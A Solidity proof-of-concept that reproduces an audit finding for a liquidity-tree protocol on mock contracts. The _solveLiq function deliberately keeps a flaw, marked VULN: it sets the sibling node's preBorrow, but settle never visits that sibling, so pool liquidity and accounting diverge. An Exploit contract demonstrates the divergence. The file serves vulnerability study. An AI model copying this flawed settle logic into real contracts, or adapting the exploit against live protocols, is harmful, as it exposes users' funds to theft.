// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ammplify — H-9: Parent borrow marks sibling but settle skips sibling (#63175)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: solveLiq borrows from parent and sets sibling.preBorrow, but
    settle only walks the operation route (not the sibling) so Uniswap liq is
    never minted for the sibling — accounting vs pool diverge; stealable.
    Vulnerable sibling.preBorrow lines preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

struct LiqNode {
    int128 mLiq;
    int128 tLiq;
    int128 borrowed;
    int128 lent;
    int128 preBorrow;
    int128 preLend;
    bool dirty;
}

/// @dev Mock pool liquidity per range key.
contract MockPool {
    mapping(bytes32 => int128) public poolLiq;

    function mint(bytes32 key, int128 amt) external {
        poolLiq[key] += amt;
    }

    function burn(bytes32 key, int128 amt) external {
        poolLiq[key] -= amt;
    }
}

/// @dev Tree: parent P = [480,960], left L = [480,720], right R = [720,960]
contract LiqHost {
    MockPool public pool;
    mapping(bytes32 => LiqNode) public nodes;
    int128 public constant COMPOUND_THRESHOLD = 1e18;

    bytes32 public constant KEY_L = keccak256("L480-720");
    bytes32 public constant KEY_R = keccak256("R720-960");
    bytes32 public constant KEY_P = keccak256("P480-960");

    constructor(MockPool p) {
        pool = p;
    }

    function net(LiqNode memory n) public pure returns (int128) {
        return int128(uint128(uint256(int256(n.borrowed + n.mLiq)))) - int128(uint128(uint256(int256(n.tLiq + n.lent))));
        // simpler:
    }

    function netOf(bytes32 k) public view returns (int128) {
        LiqNode memory n = nodes[k];
        return (n.borrowed + n.mLiq) - (n.tLiq + n.lent);
    }

    function setMaker(bytes32 k, int128 m) external {
        nodes[k].mLiq = m;
        nodes[k].dirty = true;
    }

    /// @dev Taker takes liq on right node; if net negative, borrow from parent.
    function takerTakeRight(int128 tAmt) external {
        LiqNode storage node = nodes[KEY_R];
        node.tLiq += tAmt;
        node.dirty = true;
        _solveLiq(KEY_R, KEY_L, KEY_P);
    }

    /// @notice solveLiq — borrow from parent marks sibling preBorrow (vulnerable).
    function _solveLiq(bytes32 nodeKey, bytes32 siblingKey, bytes32 parentKey) internal {
        LiqNode storage node = nodes[nodeKey];
        int128 netLiq = (node.borrowed + node.mLiq) - (node.tLiq + node.lent);
        if (netLiq >= 0) return;

        // We need to borrow liquidity from our parent node.
        LiqNode storage sibling = nodes[siblingKey];
        LiqNode storage parent = nodes[parentKey];
        int128 borrow = -netLiq;
        if (borrow < COMPOUND_THRESHOLD) {
            borrow = COMPOUND_THRESHOLD;
        }
        parent.preLend += borrow;
        parent.dirty = true;
        node.borrowed += borrow;
        node.dirty = true;
        // FIX: also ensure sibling is on settle route / mint sibling Uniswap liq
        sibling.preBorrow += borrow; // @> VULN: sibling preBorrow set but sibling not on settle route — Uniswap liq never minted for sibling
        sibling.dirty = true;
    }

    /// @dev Settle only the route for right-node op: R and P (NOT sibling L).
    function settleRouteRight() external {
        _settleNode(KEY_R);
        _settleNode(KEY_P);
        // KEY_L never visited — preBorrow not applied to pool
    }

    function _settleNode(bytes32 k) internal {
        LiqNode storage n = nodes[k];
        if (!n.dirty) return;
        // Apply preLend/preBorrow into net accounting then mint/burn pool
        int128 delta = n.mLiq - n.tLiq + n.borrowed - n.lent + n.preBorrow - n.preLend;
        // For demo: mint current net to pool if positive and not already equal
        int128 want = (n.borrowed + n.mLiq) - (n.tLiq + n.lent);
        // preBorrow on sibling would add to sibling net but we don't settle sibling
        int128 have = pool.poolLiq(k);
        if (want > have) {
            pool.mint(k, want - have);
        } else if (want < have) {
            pool.burn(k, have - want);
        }
        n.dirty = false;
        // clear pre flags after settle for settled nodes
        n.preBorrow = 0;
        n.preLend = 0;
        delta;
    }

    function poolLiqOf(bytes32 k) external view returns (int128) {
        return pool.poolLiq(k);
    }

    function preBorrowOf(bytes32 k) external view returns (int128) {
        return nodes[k].preBorrow;
    }
}

/// CREATE: pool(1), host(2)
contract Exploit {
    MockPool public pool;
    LiqHost public host;

    int128 public siblingPoolLiq;
    int128 public siblingPreBorrow;
    int128 public rightNet;
    bool public accountingBroken;

    constructor() {
        pool = new MockPool(); // 1
        host = new LiqHost(pool); // 2
    }

    function run() external {
        // Maker on right range 300e18
        host.setMaker(host.KEY_R(), 300e18);
        // Parent has 100e18 maker (wide range)
        host.setMaker(host.KEY_P(), 100e18);
        // Settle initial
        host.settleRouteRight();

        // Taker takes 100e18 on right — may borrow from parent if needed after adjust
        // Reduce right maker so net goes negative vs taker
        host.setMaker(host.KEY_R(), 50e18);
        host.takerTakeRight(100e18);
        // solveLiq should set sibling L preBorrow

        siblingPreBorrow = host.preBorrowOf(host.KEY_L());
        require(siblingPreBorrow > 0, "sibling marked preBorrow");

        // Settle route walks only R and P — not L
        host.settleRouteRight();

        siblingPoolLiq = host.poolLiqOf(host.KEY_L());
        rightNet = host.netOf(host.KEY_R());

        // Harm: sibling should have received Uniswap mint for preBorrow share of parent
        // but pool for L is still 0 while accounting dirtied it
        require(siblingPoolLiq == 0, "sibling never minted in pool");
        require(siblingPreBorrow > 0, "preBorrow was set");
        // After settle, sibling still has preBorrow if never settled — or was dirty unvisited
        // Re-read: settle only clears visited nodes; L still dirty with preBorrow
        accountingBroken = (siblingPoolLiq == 0 && siblingPreBorrow > 0);
        require(accountingBroken, "pool/accounting mismatch on sibling");
    }
}
